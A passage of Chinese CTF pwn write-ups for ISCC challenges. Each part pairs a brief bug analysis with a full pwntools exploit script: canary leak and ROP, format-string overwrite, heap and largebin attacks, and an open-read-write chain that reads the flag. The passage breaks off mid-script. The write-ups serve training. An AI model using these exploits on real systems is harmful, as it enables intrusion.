<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">x=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请选择模式\n1:远程攻击\n2:本地攻击\n3:exp调试\n&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">    r=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">2</span> :</span><br><span class="line">    r=process(<span class="string">&quot;./iscc/attachment-13&quot;</span>)</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">    r=gdb.debug(<span class="string">&quot;./iscc/attachment-12&quot;</span>,gdbscript=<span class="string">&quot;b *0x804940c&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./iscc/attachment-12&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/ret2-csu-libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">back=<span class="number">0x804931b</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;what&#x27;s the content?\n&quot;</span>,<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your answered:\n&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary------&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">p=flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>),canary,<span class="string">b&#x27;aaaa&#x27;</span>,canary,<span class="string">b&#x27;aaaa&#x27;</span>,puts_plt,back,<span class="number">1</span>,puts_got,<span class="number">8</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,p)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr-------&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base=write_addr-libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line">system=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p=flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>),canary,<span class="string">b&#x27;aaaa&#x27;</span>,canary,<span class="string">b&#x27;aaaa&#x27;</span>,system,<span class="string">&#x27;aaaa&#x27;</span>,sh) </span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>





<h4 id="Your-program"><a href="#Your-program" class="headerlink" title="Your_program"></a>Your_program</h4><p>简单看看这个程序</p>
<p>发现</p>
<p>程序是先进行认证，如果输入的key的第28位为A则通过验证，然后程序申请了一个堆块，o 位置处指针指向该堆块data域，这个堆块地址<code>+3*8</code>以及地址<code>+4*8</code>位置有函数指针，该堆块地址处存一个 我们输入的长度最大为24的name。然后提供了一个菜单，循环执行，当选择功能4的时候程序会询问你 是否真的要退出，如果输入y，则下一次循环结束后结束程序；如果输入$，则在下一次循环后释放o指向 的堆块。</p>
<p>所以</p>
<p>IDA打开：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd24e4d0d.png" alt="image-20240525022703014"></p>
<p>用gets函数读取，存在栈溢出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2542918.png" alt="image-20240525022745908"></p>
<p>格式化字符串漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2592ccb.png" alt="image-20240525022804786"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置架构和日志级别</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程进程</span></span><br><span class="line"><span class="comment"># p = process(&quot;./your_program&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;182.92.237.102&quot;</span>, <span class="number">10032</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件以获取符号信息</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./your_program&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义辅助函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>(<span class="params">p, num_bytes=<span class="number">6</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Leak memory address by receiving data until &#x27;\x7f&#x27; is encountered.&quot;&quot;&quot;</span></span><br><span class="line">    data = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(data[-num_bytes:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 地址定义</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401763</span></span><br><span class="line">ret_address = <span class="number">0x000000000040101a</span></span><br><span class="line">main_address = <span class="number">0x00000000004014C8</span></span><br><span class="line">auth_address = <span class="number">0x000000000040127A</span>  <span class="comment"># Overflow detected here</span></span><br><span class="line">overflow_variable = <span class="number">0x0000000000403668</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造利用key</span></span><br><span class="line">key_payload = <span class="string">b&quot;A&quot;</span>*<span class="number">32</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(printf_got) + p64(puts_plt) + p64(main_address)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>, key_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取printf地址</span></span><br><span class="line">printf_leaked = leak_address(p)</span><br><span class="line">log.info(<span class="string">f&quot;printf address: <span class="subst">&#123;<span class="built_in">hex</span>(printf_leaked)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc基址</span></span><br><span class="line">libc_base = printf_leaked - <span class="number">0x061c90</span></span><br><span class="line">system_address = libc_base + <span class="number">0x052290</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备格式化字符串攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_format_string</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Send payload to trigger format string vulnerability.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_app</span>(<span class="params">choice=<span class="string">b&#x27;n&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Option to clear or stay in the app.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure you want to exit? (y/n)&quot;</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request heap allocation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_heap_allocation</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Request heap allocation and write content.&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset calculation and initial key setup</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">initial_key = <span class="string">b&quot;A&quot;</span>*<span class="number">28</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>, initial_key)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to ISCC, tell me your name:&quot;</span>, <span class="string">b&quot;hacker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaking heap base address</span></span><br><span class="line">format_payload = <span class="string">b&quot;%7$s&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\xff&#x27;</span>) + p64(overflow_variable)</span><br><span class="line">exploit_format_string(format_payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;hello hack\n&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">f&quot;Heap base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clearing app state</span></span><br><span class="line">clear_app(<span class="string">b&#x27;\x24&#x27;</span>)</span><br><span class="line">clear_app()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare for system call</span></span><br><span class="line">request_heap_allocation(p64(<span class="number">0</span>)*<span class="number">3</span> + p64(system_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite heap to redirect flow</span></span><br><span class="line">overwrite_payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x3024</span>&#125;</span>c%9$hn&quot;</span>.encode().ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\xff&#x27;</span>) + p64(heap_base)</span><br><span class="line">exploit_format_string(overwrite_payload)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Interactive shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd24602d6.png" alt="image-20240525023134915"></p>
<h4 id="ISCC-U"><a href="#ISCC-U" class="headerlink" title="ISCC_U"></a>ISCC_U</h4><p>ida打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2476dc5.png" alt="image-20240525023237972"></p>
<p>申请堆块</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd256e25e.png" alt="image-20240525023308186"></p>
<p>打印为note赋的值</p>
<p>同样</p>
<p>system和binsh的地址通过计算Libc基址来获取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;182.92.237.102&#x27;</span>, <span class="number">10016</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">Size, Content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">create(<span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">malloc_hook = libc_addr - <span class="number">0x38</span> - <span class="number">0x18</span></span><br><span class="line">libcbase = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>] + <span class="number">1</span></span><br><span class="line">puts = libcbase + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &#x27;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;libcbase &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x8</span>, p32(system) + <span class="string">b&#x27;;sh;&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;cat$&#123;IFS&#125;flag.txt&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="eazy-heap"><a href="#eazy-heap" class="headerlink" title="eazy_heap"></a>eazy_heap</h4><p>IDA打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd245241c.png" alt="image-20240525023851106"></p>
<p>但是是开了一个沙盒 不能直接system</p>
<p>还有个uaf</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd23e1883.png" alt="image-20240525024041225"></p>
<p>add函数中只能，申请大chunk</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd244a175.png" alt="image-20240525024131404"></p>
<p>用largbinattack打stderr</p>
<p>然后写入house_of_apple然后用exit刷新流完成orw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./CAT_DE&#x27;</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;car choice &gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x450</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\0&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21a000</span> - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">envrion = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">target = heap_addr + <span class="number">0x17c0</span></span><br><span class="line">ptr = heap_addr + <span class="number">0xc60</span></span><br><span class="line">edit(<span class="number">0</span>, p64(target))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">12</span>, payload)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\xf1&quot;</span>)</span><br><span class="line">p.recv(<span class="number">7</span>)</span><br><span class="line">en_key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;en_key: &quot;</span> + <span class="built_in">hex</span>(en_key))</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span> + <span class="built_in">hex</span>(key))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(en_key) + p64(key)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64((heap_addr + <span class="number">0x10</span>) ^ en_key)</span><br><span class="line">edit(<span class="number">12</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x0000000700010001</span>) + p64(<span class="number">0</span>) * <span class="number">24</span> + p64(envrion - <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>, <span class="string">&quot;A&quot;</span> * <span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x140</span> - <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">edit(<span class="number">6</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x0000000700010001</span>) + p64(<span class="number">0</span>) * <span class="number">24</span> + p64(stack))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span> + libc.address</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line">add(<span class="number">0xd0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>) + orw)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h4><p>IDA打开</p>
<p>发现add函数内使用了 calloc 分配内存，但没有检查分配是否成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd258d9cc.png" alt="image-20240525024616550"></p>
<p>这样会导致内存泄露</p>
<p>同样</p>
<p>利用 large bin attack 向标准错误输出 , 然后写入 house_of_apple , 最后用 exit 刷新流完成 orw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;xxxx&#x27;</span>, [port])</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, Size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, Content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), <span 